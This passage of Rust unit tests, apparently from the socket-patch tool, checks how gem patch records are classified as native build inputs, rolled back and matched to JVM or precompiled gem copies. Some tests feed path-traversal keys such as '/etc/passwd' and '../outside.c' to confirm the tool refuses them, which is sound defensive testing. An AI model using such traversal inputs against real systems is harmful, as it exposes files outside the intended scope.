    async fn rollback_restores_the_backed_up_build() {
        for with_marker in [true, false] {
            let tmp = tempfile::tempdir().unwrap();
            let home = tmp.path();
            let gem_dir = rebuilt_gem(home, with_marker);
            let env = RubyEnv {
                cwd: home.to_path_buf(),
                rebuild: true,
                offline: true,
                progress: None,
            };
            assert_eq!(restore_original_build(&gem_dir, &env).await, Ok(true));
            let ext = home.join("extensions/p/3.4.0/a-1");
            assert_eq!(std::fs::read(ext.join("a/a.so")).unwrap(), b"original");
            assert!(ext.join("gem.build_complete").is_file());
            assert!(
                !ext.join("a/extra.so").exists(),
                "socket-patch's build is gone"
            );
            assert_eq!(
                std::fs::read(gem_dir.join("lib/a/a.so")).unwrap(),
                b"original"
            );
            // Only the marker names socket-patch's extra lib copy.
            assert_eq!(gem_dir.join("lib/a/extra.so").exists(), !with_marker);
            assert!(!gem_dir.join(MARKER_FILE).exists());
            assert!(!gem_dir.join(BACKUP_DIR).exists());
            // Nothing left to restore.
            assert_eq!(restore_original_build(&gem_dir, &env).await, Ok(false));
        }
    }

    /// A marker holds only for the record's own patched sources and the
    /// artifacts' recorded bytes.
    #[test]
    fn marker_holds_checks_sources_and_artifacts() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path();
        let gem_dir = home.join("gems/a-1");
        let ext = home.join("extensions/p/3.4.0/a-1/a");
        std::fs::create_dir_all(&ext).unwrap();
        std::fs::create_dir_all(gem_dir.join("lib/a")).unwrap();
        std::fs::write(ext.join("a.so"), b"built").unwrap();
        std::fs::write(gem_dir.join("lib/a/a.so"), b"built").unwrap();
        let copy = GemCopy::of(&gem_dir).unwrap();
        let hash = compute_git_sha256_from_bytes(b"built");
        let after = "c".repeat(64);
        let record: HashMap<String, PatchFileInfo> =
            [("ext/a/a.c".to_string(), info(&after))].into();
        let scope = NativeScope {
            inputs: vec!["ext/a/a.c".into()],
            builds_extensions: true,
            ..NativeScope::default()
        };
        let marker = BuildMarker {
            schema: MARKER_SCHEMA,
            sources: [("ext/a/a.c".to_string(), after.clone())].into(),
            extension_dir: "extensions/p/3.4.0/a-1".into(),
            ext_artifacts: [("a/a.so".to_string(), hash.clone())].into(),
            lib_artifacts: [("lib/a/a.so".to_string(), hash.clone())].into(),
            grafted: false,
        };
        assert!(marker_holds(&marker, &copy, &scope, &record));

        let other: HashMap<String, PatchFileInfo> =
            [("ext/a/a.c".to_string(), info(&"d".repeat(64)))].into();
        assert!(!marker_holds(&marker, &copy, &scope, &other));

        std::fs::write(gem_dir.join("lib/a/a.so"), b"stale").unwrap();
        assert!(!marker_holds(&marker, &copy, &scope, &record));

        let mut escaping = marker.clone();
        escaping.lib_artifacts = [("../x".to_string(), hash)].into();
        assert!(!marker_holds(&escaping, &copy, &scope, &record));
    }

    // ── native gems: what is a build input ──────────────────────────────

    /// The gemspec RubyGems writes for an installed gem, as `to_ruby`
    /// shapes it. `platform` is `None` for the `ruby` platform.
    fn to_ruby(name: &str, platform: Option<&str>, extensions: &[&str]) -> String {
        let mut text = format!(
            "# -*- encoding: utf-8 -*-\n# stub: {name} 1.18.3 {} lib\n",
            platform.unwrap_or("ruby")
        );
        text.push_str("\nGem::Specification.new do |s|\n");
        text.push_str(&format!("  s.name = \"{name}\".freeze\n"));
        text.push_str("  s.version = \"1.18.3\".freeze\n");
        if let Some(platform) = platform {
            text.push_str(&format!("  s.platform = \"{platform}\".freeze\n"));
        }
        text.push_str(
            "\n  s.required_rubygems_version = Gem::Requirement.new(\">= 0\".freeze) if \
             s.respond_to? :required_rubygems_version=\n  s.require_paths = [\"lib\".freeze]\n",
        );
        if !extensions.is_empty() {
            let list: Vec<String> = extensions
                .iter()
                .map(|e| format!("\"{e}\".freeze"))
                .collect();
            text.push_str(&format!("  s.extensions = [{}]\n", list.join(", ")));
        }
        text.push_str("  s.rubygems_version = \"3.3.26\".freeze\n");
        text.push_str("  s.installed_by_version = \"4.0.15\".freeze\nend\n");
        text
    }

    /// Files a nokogiri record may change that take part in its build:
    /// the C sources, and what `extconf.rb` builds the vendored libxml2 and
    /// libgumbo from.
    const NOKOGIRI_BUILT: &[&str] = &[
        "Cargo.lock",
        "Cargo.toml",
        "dependencies.yml",
        "ext/java/nokogiri/XmlNode.java",
        "ext/nokogiri/depend",
        "ext/nokogiri/extconf.rb",
        "ext/nokogiri/xml_node.c",
        "gumbo-parser/src/parser.c",
        "gumbo-parser/src/tag_lookup.gperf",
        "patches/libxml2/0100-CVE-2025-0000.patch",
        "patches/libxslt/0001-update-config.guess.patch",
        "ports/archives/libxml2-2.13.6.tar.xz",
        "vendor/libfoo/foo.c",
    ];

    /// Files of the same gem that Ruby loads as they are, or that nothing
    /// loads.
    const NOKOGIRI_PLAIN: &[&str] = &[
        "CHANGELOG.md",
        "Gemfile",
        "LICENSE-DEPENDENCIES.md",
        "LICENSE.md",
        "README.md",
        "bin/nokogiri",
        "doc/guide.md",
        "lib/nokogiri/3.4/nokogiri.bundle",
        "lib/nokogiri/version/constant.rb",
        "lib/nokogiri/xml/node.rb",
        "nokogiri.gemspec",
        "spec/node_spec.rb",
        "test/xml/test_node.rb",
    ];

    fn nokogiri_files(extra: &[&str]) -> HashMap<String, PatchFileInfo> {
        let all: Vec<&str> = NOKOGIRI_BUILT
            .iter()
            .chain(NOKOGIRI_PLAIN)
            .chain(extra)
            .copied()
            .collect();
        files(&all)
    }

    /// A build that read none of a record's inputs is told from one that
    /// read any of them, and nothing is concluded where a read leaves no
    /// trace.
    #[test]
    fn a_build_that_read_none_of_the_inputs_is_told_from_one_that_read_any() {
        let tmp = tempfile::tempdir().unwrap();
        // A kernel watch on Linux, access times elsewhere when the
        // filesystem keeps them.
        if !cfg!(target_os = "linux") && !records_reads(tmp.path()) {
            eprintln!("SKIP: this filesystem does not record reads in access times");
            return;
        }
        let gem_dir = tmp.path().join("gem");
        std::fs::create_dir_all(gem_dir.join("patches/lib")).unwrap();
        std::fs::create_dir_all(gem_dir.join("ext/a")).unwrap();
        std::fs::write(gem_dir.join("ext/a/a.c"), "int a;\n").unwrap();
        std::fs::write(gem_dir.join("patches/lib/0001.patch"), "fix\n").unwrap();
        let scope = NativeScope {
            inputs: vec![
                "ext/a/a.c".to_string(),
                "ext/a/deleted.c".to_string(),
                "patches/lib/0001.patch".to_string(),
            ],
            builds_extensions: true,
            ..NativeScope::default()
        };
        let both = [
            "ext/a/a.c".to_string(),
            "patches/lib/0001.patch".to_string(),
        ];

        // An input the record deletes is not there to watch.
        let watch = watch_inputs(&gem_dir, &scope);
        assert_eq!(watch.inputs, both);
        // Looking at a file, or listing its dir, is not reading it.
        std::fs::metadata(gem_dir.join("ext/a/a.c")).unwrap();
        assert_eq!(std::fs::read_dir(gem_dir.join("ext/a")).unwrap().count(), 1);
        assert_eq!(
            unread_inputs(&gem_dir, &watch, tmp.path()),
            Some(both.to_vec())
        );

        // One read is a build of something the patch changes.
        let watch = watch_inputs(&gem_dir, &scope);
        std::fs::read(gem_dir.join("patches/lib/0001.patch")).unwrap();
        assert_eq!(unread_inputs(&gem_dir, &watch, tmp.path()), None);

        // Nothing to watch, nothing concluded.
        let none = watch_inputs(&gem_dir, &NativeScope::default());
        assert_eq!(unread_inputs(&gem_dir, &none, tmp.path()), None);
        assert!(!tmp.path().join(".socket-patch-read-probe").exists());
    }

    /// In the source-built gem (its gemspec declares the extension)
    /// everything `extconf.rb` may build from is an input, not just the C
    /// files under the script's dir: a record that only adds
    /// `patches/libxml2/<n>.patch` changes the compiled library.
    #[test]
    fn classify_nokogiri_built_from_source() {
        let spec = to_ruby("nokogiri", None, &["ext/nokogiri/extconf.rb"]);
        let facts = SpecFacts::of(&spec, "nokogiri-1.18.3");
        assert_eq!(facts.platform, None);
        let scope = classify(&facts, &nokogiri_files(&["lib/nokogiri/css/parser.y"]));
        let mut expected: Vec<&str> = NOKOGIRI_BUILT.to_vec();
        // A grammar counts in a gem that builds, as before.
        expected.push("lib/nokogiri/css/parser.y");
        expected.sort();
        assert_eq!(scope.inputs, expected);
        assert!(scope.builds_extensions);
        assert_eq!(scope.precompiled, None);
        assert_eq!(
            scope.source_gem().map(|g| g.full_name()).as_deref(),
            Some("nokogiri-1.18.3")
        );

        let only_a_patch = classify(
            &facts,
            &files(&["patches/libxml2/0100-CVE-2025-0000.patch"]),
        );
        assert_eq!(
            only_a_patch.inputs,
            ["patches/libxml2/0100-CVE-2025-0000.patch"]
        );
    }

    /// The precompiled platform gem declares no extensions and still runs
    /// compiled code: the same files are inputs, rebuilt from the
    /// ruby-platform gem of its version. A grammar under `lib/` is not one
    /// (the gem packs its generated parser, which Ruby loads).
    #[test]
    fn classify_nokogiri_precompiled() {
        let spec = to_ruby("nokogiri", Some("arm64-darwin"), &[]);
        let facts = SpecFacts::of(&spec, "nokogiri-1.18.3-arm64-darwin");
        assert_eq!(facts.platform.as_deref(), Some("arm64-darwin"));
        let scope = classify(&facts, &nokogiri_files(&["lib/nokogiri/css/parser.y"]));
        assert_eq!(scope.inputs, NOKOGIRI_BUILT);
        assert!(!scope.builds_extensions);
        assert_eq!(scope.precompiled.as_deref(), Some("arm64-darwin"));
        let source = scope.source_gem().unwrap();
        assert_eq!(source.full_name(), "nokogiri-1.18.3");
        assert_eq!(source.platform, None, "the ruby-platform source gem");

        let ruby_only = classify(&facts, &files(NOKOGIRI_PLAIN));
        assert!(ruby_only.inputs.is_empty(), "{:?}", ruby_only.inputs);
    }

    /// A pure-Ruby gem (no extensions, the `ruby` platform) is classified
    /// as before: whatever its files are called, only a C source under
    /// `ext/` is taken for one, and nothing else needs a build.
    #[test]
    fn classify_pure_ruby_gem_is_unchanged() {
        let spec = to_ruby("rack", None, &[]);
        let facts = SpecFacts::of(&spec, "rack-1.18.3");
        assert_eq!(facts.platform, None);
        let scope = classify(
            &facts,
            &files(&[
                "data/x.yml",
                "lib/rack.rb",
                "patches/a.patch",
                "ports/archives/a.tar.xz",
                "dependencies.yml",
                "Cargo.toml",
                "vendor/x.c",
                "gumbo-parser/src/parser.c",
            ]),
        );
        assert!(scope.inputs.is_empty(), "{:?}", scope.inputs);
        assert!(!scope.builds_extensions);
        assert_eq!(scope.precompiled, None);
        let with_ext = classify(&facts, &files(&["data/x.yml", "ext/x.c"]));
        assert_eq!(with_ext.inputs, ["ext/x.c"]);
    }

    /// The JRuby build of a gem is told by its platform, from the gem's
    /// dir name or its gemspec, and by having nothing for RubyGems to
    /// build. A `java` gem that declares extensions (jruby-launcher
    /// compiles its launcher at install time) is a gem RubyGems built, and
    /// keeps the rebuild every such gem gets.
    #[test]
    fn a_jvm_gem_is_told_by_its_platform() {
        let spec = to_ruby("nokogiri", Some("java"), &[]);
        let facts = SpecFacts::of(&spec, "nokogiri-1.18.3-java");
        assert_eq!(facts.jvm_platform(), Some("java"));
        let declares = to_ruby("jruby-launcher", Some("java"), &["extconf.rb"]);
        let facts = SpecFacts::of(&declares, "jruby-launcher-1.18.3-java");
        assert_eq!(facts.jvm_platform(), None);
        let scope = classify(&facts, &files(&["jrubyexe.cpp", "lib/jruby-launcher.rb"]));
        assert!(scope.builds_extensions);
        assert_eq!(scope.precompiled, None);
        assert_eq!(scope.inputs, ["jrubyexe.cpp"]);
        let universal = to_ruby("json", Some("universal-java-17"), &[]);
        let facts = SpecFacts::of(&universal, "json-1.18.3-universal-java-17");
        assert_eq!(facts.jvm_platform(), Some("universal-java-17"));
        for platform in [None, Some("arm64-darwin"), Some("x86_64-linux-gnu")] {
            let spec = to_ruby("nokogiri", platform, &[]);
            let full_name = match platform {
                Some(p) => format!("nokogiri-1.18.3-{p}"),
                None => "nokogiri-1.18.3".to_string(),
            };
            assert_eq!(
                SpecFacts::of(&spec, &full_name).jvm_platform(),
                None,
                "{platform:?}"
            );
        }
        assert!(is_java_platform("java"));
        assert!(is_java_platform("jruby"));
        assert!(is_java_platform("universal-java-17"));
        for platform in ["arm64-darwin", "x86_64-linux-gnu", "x64-mingw-ucrt"] {
            assert!(!is_java_platform(platform), "{platform}");
        }
    }

    /// What a JVM gem's jars are built from, by name: sources and the build
    /// files of the tools that build them. A jar or a class file is what
    /// they are built into: a record that replaces one whole patches the
    /// code the JVM loads, and is no build input.
    #[test]
    fn jvm_build_inputs_are_told_by_name() {
        for path in [
            "ext/java/nokogiri/XmlNode.java",
            "lib/nokogiri/internals/Helper.JAVA",
            "src/main/kotlin/A.kt",
            "src/main/scala/B.scala",
            "pom.xml",
            "ext/POM.XML",
            "build.xml",
            "build.gradle",
            "build.gradle.kts",
            "Mavenfile",
            "ext/mavenfile",
            // Wherever it sits: a template counts too.
            "templates/pom.xml",
        ] {
            assert!(is_jvm_build_input(path), "{path}");
        }
        for path in [
            "lib/nokogiri/nokogiri.jar",
            "lib/nokogiri/jruby/xerces/xercesImpl.JAR",
            "lib/a/B.class",
            "lib/nokogiri/xml/node.rb",
            "ext/nokogiri/xml_node.c",
            "ext/nokogiri/extconf.rb",
            "dependencies.yml",
            "patches/libxml2/0001.patch",
            "lib/java.rb",
            "lib/jar",
            "lib/.java",
            "pom.xml.bak",
            "docs/build.gradle.md",
            "settings.xml",
        ] {
            assert!(!is_jvm_build_input(path), "{path}");
        }
    }

    /// The per-file rule of a JVM copy: only an input of a C build can be
    /// left out. One the record replaces is taken when the copy ships it,
    /// one it adds never is. Every other file is taken, held or not: a
    /// Ruby file that is missing from the copy is a missing file, not a
    /// file to skip.
    #[test]
    fn a_jvm_copy_takes_the_files_of_its_own_build() {
        let replaces = info(&"a".repeat(64));
        let adds = PatchFileInfo {
            before_hash: String::new(),
            after_hash: "a".repeat(64),
        };
        // C build inputs the record replaces: taken when the copy holds
        // them (dead code there), skipped when it does not.
        for path in [
            "ext/nokogiri/xml_node.c",
            "ext/nokogiri/extconf.rb",
            "ext/java/nokogiri/XmlNode.java",
            "patches/libxml2/0001.patch",
            "ports/archives/libxml2-2.13.9.tar.xz",
            "gumbo-parser/src/parser.c",
            "lib/nokogiri/include/x.h",
        ] {
            assert!(jvm_takes(path, &replaces, true), "held {path}");
            assert!(!jvm_takes(path, &replaces, false), "not held {path}");
        }
        // Any other file the record replaces is part of every build of
        // the gem: taken whether the copy holds it or not, so that one
        // deleted from the copy fails as a missing file.
        for path in [
            "lib/nokogiri/xml/node.rb",
            "lib/nokogiri.rb",
            "dependencies.yml",
            "lib/nokogiri/nokogiri.jar",
            "bin/nokogiri",
            "README.md",
        ] {
            assert!(jvm_takes(path, &replaces, true), "held {path}");
            assert!(jvm_takes(path, &replaces, false), "not held {path}");
        }
        // Added files a C build alone would read: skipped, even where the
        // copy happens to hold something at the path.
        for path in [
            "ext/nokogiri/new_source.c",
            "ext/nokogiri/include/new.h",
            "ext/java/nokogiri/New.java",
            "patches/libxml2/0100-fix.patch",
            "ports/patches/libxml2/0100-fix.patch",
            "ports/archives/libxml2-2.13.9.tar.xz",
            "lib/nokogiri/extra.h",
            "gumbo-parser/src/new.c",
            "Cargo.toml",
            "CMakeLists.txt",
            "extconf.rb",
        ] {
            assert!(!jvm_takes(path, &adds, false), "{path}");
            assert!(!jvm_takes(path, &adds, true), "held {path}");
        }
        // Any other added file is created.
        for path in [
            "lib/nokogiri/xml/new_helper.rb",
            "lib/nokogiri/data.yml",
            "data/entities.json",
            "lib/nokogiri/extra.jar",
            "README.md",
        ] {
            assert!(jvm_takes(path, &adds, false), "{path}");
        }
        // A key that could leave the gem dir is never dropped quietly: the
        // apply engine refuses the record for it.
        for path in ["../outside.c", "/etc/passwd", "ext/../../x.c", ""] {
            assert!(jvm_takes(path, &adds, false), "{path:?}");
            assert!(jvm_takes(path, &replaces, false), "{path:?}");
        }
    }

    /// The sources of a JVM gem's jars keep a record from being a build of
    /// the patch only when the record does not bring the compiled code
    /// itself: the copy's own platform's record is the `java` gem's diff,
    /// and a record that replaces or adds a jar or a class file carries
    /// what the JVM loads.
    #[test]
    fn jvm_sources_hold_up_only_a_record_without_the_compiled_code() {
        let ruby = "pkg:gem/a@1?platform=ruby";
        let source_only = files(&["ext/java/a/A.java", "lib/a.rb"]);
        for key in [ruby, "pkg:gem/a@1", "pkg:gem/a@1?platform=arm64-darwin"] {
            assert_eq!(
                jvm_unbuilt_inputs("java", key, &source_only),
                ["ext/java/a/A.java"],
                "{key}"
            );
        }
        // The copy's own record, whichever JVM platform it is.
        assert!(jvm_unbuilt_inputs("java", "pkg:gem/a@1?platform=java", &source_only).is_empty());
        assert!(jvm_unbuilt_inputs(
            "universal-java-17",
            "pkg:gem/a@1?platform=universal-java-17",
            &source_only
        )
        .is_empty());
        assert_eq!(
            jvm_unbuilt_inputs(
                "universal-java-17",
                "pkg:gem/a@1?platform=java",
                &source_only
            ),
            ["ext/java/a/A.java"]
        );
        // The record brings the jar (or a class) built from the source.
        for compiled in ["lib/a/a.jar", "lib/a/A.class", "lib/a/B.JAR"] {
            let with_code = files(&["ext/java/a/A.java", "pom.xml", compiled]);
            assert!(
                jvm_unbuilt_inputs("java", ruby, &with_code).is_empty(),
                "{compiled}"
            );
            assert!(is_compiled_jvm_code(compiled), "{compiled}");
        }
        for path in ["lib/a.rb", "lib/jar", "lib/.jar", "ext/java/a/A.java"] {
            assert!(!is_compiled_jvm_code(path), "{path}");
        }
        // No source, nothing held up.
        assert!(jvm_unbuilt_inputs("java", ruby, &files(&["lib/a.rb", "ext/a/a.c"])).is_empty());
        // Sorted, every one of them.
        assert_eq!(
            jvm_unbuilt_inputs("java", ruby, &files(&["pom.xml", "ext/java/a/A.java"])),
            ["ext/java/a/A.java", "pom.xml"]
        );
    }

    /// `--no-gem-native-rebuild` warns in the tense of the run: a dry run
    /// writes nothing and says what `apply` would do.
    #[test]
    fn the_opt_out_warning_of_a_dry_run_says_what_apply_would_do() {
        for jars in [false, true] {
            let (code, wet) = opted_out_warning("pkg:gem/a@1", "ext/a/a.c", jars, false);
            assert_eq!(code, NOT_REBUILT_REASON);
            assert!(wet.contains("written without rebuilding"), "{wet}");
            assert!(!wet.contains("would"), "{wet}");
            let (code, dry) = opted_out_warning("pkg:gem/a@1", "ext/a/a.c", jars, true);
            assert_eq!(code, NOT_REBUILT_REASON);
            assert!(
                dry.starts_with("pkg:gem/a@1: dry run: ")
                    && dry.contains("apply would write them without rebuilding")
                    && dry.contains("vex would not attest it"),
                "{dry}"
            );
            assert!(!dry.contains(", written "), "{dry}");
            for text in [&wet, &dry] {
                assert!(text.contains("(--no-gem-native-rebuild)"), "{text}");
                assert!(text.contains("(ext/a/a.c)"), "{text}");
            }
        }
    }

    /// A hand-laid JVM copy of the gem `a`: its Ruby file, a C source it
    /// ships as dead weight, a Java source and the jar built from it.
    fn jvm_gem(home: &Path) -> GemCopy {
        let gem_dir = home.join("gems/a-1-java");
        for (rel, bytes) in [
            ("lib/a.rb", &b"require 'a/a.jar'\n"[..]),
            ("lib/a/a.jar", b"PK jar"),
            ("ext/a/a.c", b"int a;"),
            ("ext/java/a/A.java", b"class A {}"),
        ] {
            let path = gem_dir.join(rel);
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::write(path, bytes).unwrap();
        }
        std::fs::create_dir_all(home.join("specifications")).unwrap();
        std::fs::write(
            home.join("specifications/a-1-java.gemspec"),
            "Gem::Specification.new do |s|\n  s.name = \"a\".freeze\n  \
             s.version = \"1\".freeze\n  s.platform = \"java\".freeze\n  \
             s.require_paths = [\"lib\".freeze]\nend\n",
        )
        .unwrap();
        GemCopy::of(&gem_dir).unwrap()
    }

    fn sorted_keys(files: &HashMap<String, PatchFileInfo>) -> Vec<String> {
        let mut keys: Vec<String> = files.keys().cloned().collect();
        keys.sort();
        keys
    }

    /// The record a JVM copy is judged by, wherever a record is compared
    /// with an installed copy: matching a release variant, `apply --check`,
    /// `vex` and `rollback` all read it through the same rule.
    #[tokio::test]
    async fn a_jvm_copy_is_judged_by_the_files_it_takes() {
        let tmp = tempfile::tempdir().unwrap();
        let copy = jvm_gem(&tmp.path().join("jruby"));
        let added = |after: &str| PatchFileInfo {
            before_hash: String::new(),
            after_hash: after.repeat(64),
        };
        let record: HashMap<String, PatchFileInfo> = [
            ("lib/a.rb".to_string(), info(&"1".repeat(64))),
            ("ext/a/a.c".to_string(), info(&"2".repeat(64))),
            // A jar the record replaces whole.
            ("lib/a/a.jar".to_string(), info(&"8".repeat(64))),
            // A C source this build does not ship: left out.
            ("ext/a/gone.c".to_string(), info(&"3".repeat(64))),
            // A Ruby file the copy lacks: part of every build of the gem,
            // so it is taken, and missing.
            ("lib/a/missing.rb".to_string(), info(&"4".repeat(64))),
            // Added files: a library patch, and a Ruby file.
            ("patches/lib/0001.patch".to_string(), added("5")),
            ("lib/a/new.rb".to_string(), added("6")),
        ]
        .into();
        let taken = [
            "ext/a/a.c",
            "lib/a.rb",
            "lib/a/a.jar",
            "lib/a/missing.rb",
            "lib/a/new.rb",
        ];
        let gem = InstalledGem::at(&copy.gem_dir).await;

        // The ruby-platform record, qualified or not, is read file by file.
        for purl in ["pkg:gem/a@1", "pkg:gem/a@1?platform=ruby"] {
            let view = jvm_record(&copy.gem_dir, "java", purl, &record).await;
            assert_eq!(sorted_keys(&view.files), taken, "{purl}");
            // A replaced jar is a file like any other, not a build input.
            assert!(view.jvm_inputs.is_empty(), "{purl}: {:?}", view.jvm_inputs);
            assert_eq!(
                sorted_keys(&*gem.record_files(purl, &record).await),
                taken,
                "{purl}"
            );
            assert_eq!(
                sorted_keys(&*installed_files(&copy.gem_dir, purl, &record).await),
                taken,
                "{purl}"
            );
            assert_eq!(
                sorted_keys(&rollback_files(&copy.gem_dir, purl, &record).await),
                taken,
                "{purl}"
            );
            let telling = discriminating_files(&copy.gem_dir, purl, &record).await;
            assert_eq!(sorted_keys(&telling), taken, "{purl}");
        }
        // A record qualified for a platform names the archive it was
        // written for, the copy's own included: every file of it is
        // required, in every reader, and one the copy lacks is missing.
        for purl in [
            "pkg:gem/a@1?platform=java",
            "pkg:gem/a@1?platform=arm64-darwin",
        ] {
            let view = jvm_record(&copy.gem_dir, "java", purl, &record).await;
            assert_eq!(view.files, record, "{purl}");
            let whole = gem.record_files(purl, &record).await;
            assert!(matches!(whole, std::borrow::Cow::Borrowed(_)), "{purl}");
            assert_eq!(
                *installed_files(&copy.gem_dir, purl, &record).await,
                record,
                "{purl}"
            );
            assert_eq!(
                rollback_files(&copy.gem_dir, purl, &record).await,
                record,
                "{purl}"
            );
            let telling = discriminating_files(&copy.gem_dir, purl, &record).await;
            assert_eq!(*telling, record, "{purl}");
        }
        // Nothing is built for such a copy, so no marker is asked for: C
        // sources, a library patch and a replaced jar are no build inputs
        // there.
        let purl = "pkg:gem/a@1?platform=ruby";
        assert_eq!(
            verify_native_build(&copy.gem_dir, purl, &record).await,
            Ok(())
        );
        assert_eq!(gem.verify_native_build(purl, &record).await, Ok(()));

        // A record of a C build alone: no file of it is part of this build.
        let c_only: HashMap<String, PatchFileInfo> =
            [("patches/lib/0001.patch".to_string(), added("5"))].into();
        assert!(installed_files(&copy.gem_dir, purl, &c_only)
            .await
            .is_empty());
        assert!(rollback_files(&copy.gem_dir, purl, &c_only)
            .await
            .is_empty());
        assert_eq!(
            verify_native_build(&copy.gem_dir, purl, &c_only).await,
            Ok(())
        );

        // A ruby-platform record that changes what the jars were built
        // from, and brings no jar, is never attested, whether the copy
        // ships that source or not.
        let own = "pkg:gem/a@1?platform=java";
        for jvm_key in ["ext/java/a/A.java", "ext/java/a/Gone.java", "pom.xml"] {
            let mut with_java = record.clone();
            with_java.remove("lib/a/a.jar");
            with_java.insert(jvm_key.to_string(), info(&"7".repeat(64)));
            let view = jvm_record(&copy.gem_dir, "java", purl, &with_java).await;
            assert_eq!(view.jvm_inputs, [jvm_key]);
            // Only a C build input the copy lacks is left out.
            assert_eq!(
                view.files.contains_key(jvm_key),
                jvm_key != "ext/java/a/Gone.java",
                "{jvm_key}"
            );
            assert_eq!(
                verify_native_build(&copy.gem_dir, purl, &with_java).await,
                Err(NOT_REBUILT_REASON.to_string()),
                "{jvm_key}"
            );
            // The same record with the jar built from it is the patch.
            let mut with_jar = with_java.clone();
            with_jar.insert("lib/a/a.jar".to_string(), info(&"8".repeat(64)));
            assert_eq!(
                verify_native_build(&copy.gem_dir, purl, &with_jar).await,
                Ok(()),
                "{jvm_key}"
            );
            // And the copy's own record is the java gem's diff, whole.
            let strict = jvm_record(&copy.gem_dir, "java", own, &with_java).await;
            assert!(strict.jvm_inputs.is_empty(), "{jvm_key}");
            assert_eq!(strict.files, with_java, "{jvm_key}");
            assert_eq!(
                verify_native_build(&copy.gem_dir, own, &with_java).await,
                Ok(()),
                "{jvm_key}"
            );
        }

        // Of the records of one version, the copy's own is the one that
        // names its platform; an MRI copy and a bare dir have none.
        let keys = [purl, "pkg:gem/a@1?platform=arm64-darwin", own];
        assert_eq!(own_platform_record(&copy.gem_dir, keys).await, Some(own));
        assert_eq!(own_platform_record(&copy.gem_dir, [purl]).await, None);
        assert_eq!(own_platform_record(tmp.path(), keys).await, None);

        // Any other copy takes the record as it is.
        let mri = precompiled_gem(&tmp.path().join("mri"));
        let whole = installed_files(&mri.gem_dir, purl, &record).await;
        assert!(matches!(whole, std::borrow::Cow::Borrowed(_)));
        assert_eq!(*whole, record);
        assert_eq!(*installed_files(tmp.path(), purl, &record).await, record);
    }

    /// With a record for the copy's own platform in the manifest, that
    /// record alone is the copy's for every reader that selects records:
    /// the ruby-platform record, which would match a JRuby copy by taking
    /// no file of it, is not selected beside it. Without one, or when the
    /// copy's own record is for other bytes, the selection is as it was.
    #[tokio::test]
    async fn a_copys_own_platform_record_is_selected_alone() {
        use crate::patch::apply::{select_installed_variants, select_installed_variants_any};
        let tmp = tempfile::tempdir().unwrap();
        let copy = jvm_gem(&tmp.path().join("jruby"));
        let ruby = "pkg:gem/a@1?platform=ruby";
        let own = "pkg:gem/a@1?platform=java";
        let c_only: HashMap<String, PatchFileInfo> = [(
            "patches/lib/0001.patch".to_string(),
            PatchFileInfo {
                before_hash: String::new(),
                after_hash: "5".repeat(64),
            },
        )]
        .into();
        let jar = |before: &[u8]| -> HashMap<String, PatchFileInfo> {
            [(
                "lib/a/a.jar".to_string(),
                PatchFileInfo {
                    before_hash: compute_git_sha256_from_bytes(before),
                    after_hash: "8".repeat(64),
                },
            )]
            .into()
        };
        let (its_jar, another_jar) = (jar(b"PK jar"), jar(b"PK another jar"));

        // Alone, the ruby-platform record matches the copy.
        assert_eq!(
            select_installed_variants(&copy.gem_dir, &[(ruby, &c_only)]).await,
            [0]
        );
        // Beside the copy's own record it is not the copy's.
        let both = [(ruby, &c_only), (own, &its_jar)];
        assert_eq!(select_installed_variants(&copy.gem_dir, &both).await, [1]);
        assert_eq!(
            select_installed_variants_any(std::slice::from_ref(&copy.gem_dir), &both).await,
            [1]
        );
        // An own-platform record written for other bytes does not match,
        // and takes nothing from the record that does.
        let other_bytes = [(ruby, &c_only), (own, &another_jar)];
        assert_eq!(
            select_installed_variants(&copy.gem_dir, &other_bytes).await,
            [0]
        );
        // A copy of another platform keeps what it matched.
        let mri = precompiled_gem(&tmp.path().join("mri"));
        let c_source: HashMap<String, PatchFileInfo> = [(
            "ext/a/a.c".to_string(),
            PatchFileInfo {
                before_hash: compute_git_sha256_from_bytes(b"int a;"),
                after_hash: "2".repeat(64),
            },
        )]
        .into();
        let for_mri = [(ruby, &c_source), (own, &its_jar)];
        assert_eq!(select_installed_variants(&mri.gem_dir, &for_mri).await, [0]);
        // Over both copies, each takes its own.
        assert_eq!(
            select_installed_variants_any(&[mri.gem_dir.clone(), copy.gem_dir.clone()], &for_mri)
                .await,
            [0, 1]
        );
    }

    /// A `java` gem that declares extensions is no JVM build of a gem: its
    /// record is read whole and classified like that of any gem RubyGems
    /// built, so a C source of it is a build input that needs a rebuild.
    #[tokio::test]
    async fn a_java_gem_that_builds_an_extension_is_not_read_file_by_file() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("jruby");
        let gem_dir = home.join("gems/a-1-java");
        std::fs::create_dir_all(gem_dir.join("ext/a")).unwrap();
        std::fs::write(gem_dir.join("ext/a/a.c"), b"int a;").unwrap();
        std::fs::create_dir_all(home.join("specifications")).unwrap();
        std::fs::write(
            home.join("specifications/a-1-java.gemspec"),
            "Gem::Specification.new do |s|\n  s.name = \"a\".freeze\n  \
             s.version = \"1\".freeze\n  s.platform = \"java\".freeze\n  \
             s.require_paths = [\"lib\".freeze]\n  \
             s.extensions = [\"ext/a/extconf.rb\".freeze]\nend\n",
        )
        .unwrap();
        let record: HashMap<String, PatchFileInfo> = [
            ("ext/a/a.c".to_string(), info(&"2".repeat(64))),
            ("lib/a/gone.rb".to_string(), info(&"3".repeat(64))),
        ]
        .into();
        let gem = InstalledGem::at(&gem_dir).await;
        assert!(gem.jvm().is_none());
        let purl = "pkg:gem/a@1?platform=ruby";
        assert_eq!(*gem.record_files(purl, &record).await, record);
        assert_eq!(rollback_files(&gem_dir, purl, &record).await, record);
        let scope = gem.scope(&record);
        assert!(scope.builds_extensions);
        assert_eq!(scope.inputs, ["ext/a/a.c"]);
        // No marker: the extension was not built from the patched source.
        assert_eq!(
            gem.verify_native_build(purl, &record).await,
            Err(NOT_REBUILT_REASON.to_string())
        );
    }

    /// `apply` on a JVM copy that takes no file of a record writes nothing
    /// and says what that means in a typed caveat: the code is not in
    /// that build (a patch of the C build alone, which leaves nothing to
    /// do), or the record changes sources of the jars and the patch is
    /// incomplete. Neither starts a Ruby or reads a blob.
    #[tokio::test]
    async fn a_jvm_copy_with_nothing_to_write_says_what_that_means() {
        let tmp = tempfile::tempdir().unwrap();
        let copy = jvm_gem(&tmp.path().join("jruby"));
        let blobs = tmp.path().join("blobs");
        let added = PatchFileInfo {
            before_hash: String::new(),
            after_hash: "5".repeat(64),
        };
